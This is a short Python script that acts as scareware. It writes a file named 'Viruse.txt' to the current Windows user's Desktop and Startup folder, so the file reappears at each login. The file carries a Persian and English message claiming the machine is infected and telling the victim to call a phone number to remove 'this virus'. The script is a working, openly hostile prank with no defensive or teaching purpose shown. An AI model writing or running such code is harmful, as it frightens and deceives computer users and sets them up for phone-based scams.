from pathlib import Path
import getpass
username = getpass.getuser()

def File(path):
    file_path = Path(f'{path}/Viruse.txt')
    file_path.parent.mkdir(parents=True, exist_ok=True)
    text = """
        سلام من ایلیا هستم      
              برای ازبین بردن این ویروس باید با شماره
              090X XXX XXXX
              تماس بگیرید
              Hello, I am iLyA.
              To eliminate this virus, you must call the number
              090X XXX XXXX.
    """
    file_path.write_text(text, encoding='utf-8')

arrayPath = [f"C:\\Users\\{username}\\Desktop", f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"]
for i in arrayPath:
    print("i : ", i)
    File(i)